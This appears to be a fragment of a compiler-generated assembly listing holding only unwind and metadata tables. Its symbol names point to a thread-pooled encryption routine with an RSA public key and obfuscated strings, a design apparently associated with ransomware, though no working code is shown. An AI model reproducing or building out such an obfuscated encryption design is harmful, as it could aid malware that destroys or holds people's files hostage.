??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData DD 02H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	040H
	DW	01aeH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 025054719H
	DD	0118231dH
	DD	070110037H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01a0H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+15
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc DD 0c8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2
	DD	0a8H
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1
	DD	084H
	DD	01H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0
	ORG $+144
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD 025051c01H
	DD	0117231cH
	DD	07010001dH
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	01e4H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z DD 035053d19H
	DD	010e3313H
	DD	07007003bH
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	01c8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcName$0 DB 052H ; ThreadpoolHandler
	DB	073H
	DB	061H
	DB	050H
	DB	075H
	DB	062H
	DB	06cH
	DB	069H
	DB	063H
	DB	04bH
	DB	065H
	DB	079H
	DB	00H
	ORG $+3
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcName$1 DB 043H ; ThreadpoolHandler
	DB	072H
	DB	079H
	DB	070H
	DB	074H
	DB	06fH
	DB	050H
	DB	072H
	DB	06fH
	DB	076H
	DB	069H
	DB	064H
	DB	065H
	DB	072H
	DB	00H
	ORG $+1
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcVarDesc DD 058H ; ThreadpoolHandler
	DD	08H
	DQ	FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcName$1
	DD	038H
	DD	08H
	DQ	FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcName$0
	ORG $+96
?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcFrameData DD 02H ; ThreadpoolHandler
	DD	00H
	DQ	FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b09H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b09H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0911H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0911H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCryptoProvider@@YAHPEA_K@Z DD 035051301H
	DD	010e3313H
	DD	070070053H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0task_info_@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Wait@threadpool@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	070060025H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?IsActive@threadpool@@YAHH@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PutFinalTask@threadpool@@YAHH@Z DD 025051201H
	DD	010d2312H
	DD	070060029H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 025051701H
	DD	01122317H
	DD	0700b0035H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Start@threadpool@@YAHH@Z DD 035051201H
	DD	010d3312H
	DD	070060027H
